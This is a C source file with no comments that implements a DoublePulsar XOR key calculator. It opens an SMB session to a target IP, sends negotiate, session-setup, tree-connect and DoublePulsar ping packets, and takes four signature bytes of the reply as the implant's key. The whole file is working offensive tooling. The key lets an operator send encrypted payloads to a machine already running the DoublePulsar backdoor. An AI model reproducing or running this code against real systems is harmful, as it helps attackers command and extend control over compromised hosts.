#define _GNU_SOURCE
#include "config.h"

#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

extern int smb_connect(const char *ip, int port);

static int
dp_send_all(int sock, const void *data, size_t length)
{
    const unsigned char *p = data;

    while (length != 0) {
        ssize_t n = send(sock, p, length, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        p += (size_t)n;
        length -= (size_t)n;
    }
    return 0;
}

static int
dp_recv_all(int sock, void *data, size_t length)
{
    unsigned char *p = data;

    while (length != 0) {
        ssize_t n = recv(sock, p, length, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        p += (size_t)n;
        length -= (size_t)n;
    }
    return 0;
}

static int
dp_exchange(int sock, const void *packet, size_t packet_length,
            unsigned char **response, size_t *response_length)
{
    unsigned char header[4];
    unsigned char *frame;
    size_t payload_length;

    if (dp_send_all(sock, packet, packet_length) < 0)
        return -1;
    if (dp_recv_all(sock, header, sizeof(header)) < 0)
        return -1;

    payload_length = ((size_t)header[1] << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];
    frame = malloc(sizeof(header) + payload_length);
    if (frame == NULL)
        return -1;

    for (size_t i = 0; i < sizeof(header); ++i)
        frame[i] = header[i];

    if (dp_recv_all(sock, frame + sizeof(header), payload_length) < 0) {
        free(frame);
        return -1;
    }

    *response = frame;
    *response_length = sizeof(header) + payload_length;
    return 0;
}

unsigned int
DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    int sock;
    unsigned char *response = NULL;
    size_t response_length = 0;
    unsigned int key = 0;

    sock = smb_connect(ip, port);
    if (sock < 0)
        return 0;

    if (dp_exchange(sock, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT),
                    &response, &response_length) < 0)
        goto done;
    free(response);
    response = NULL;

    if (dp_exchange(sock, SMB_SESSION_SETUP_PKT,
                    sizeof(SMB_SESSION_SETUP_PKT),
                    &response, &response_length) < 0)
        goto done;
    free(response);
    response = NULL;

    if (dp_exchange(sock, SMB_TREE_CONNECT_PKT,
                    sizeof(SMB_TREE_CONNECT_PKT),
                    &response, &response_length) < 0)
        goto done;
    free(response);
    response = NULL;

    if (dp_exchange(sock, DP_PING_PKT, sizeof(DP_PING_PKT),
                    &response, &response_length) < 0)
        goto done;

    if (SMB_RESP_SIGNATURE_START <= response_length &&
        response_length - SMB_RESP_SIGNATURE_START >= 4 &&
        SMB_RESP_SIGNATURE_END >= SMB_RESP_SIGNATURE_START &&
        (SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START == 3 ||
         SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START == 4)) {
        const unsigned char *signature =
            response + SMB_RESP_SIGNATURE_START;
        key = ((unsigned int)signature[0] << 24) |
              ((unsigned int)signature[1] << 16) |
              ((unsigned int)signature[2] << 8) |
              (unsigned int)signature[3];
    }

done:
    free(response);
    close(sock);
    return key;
}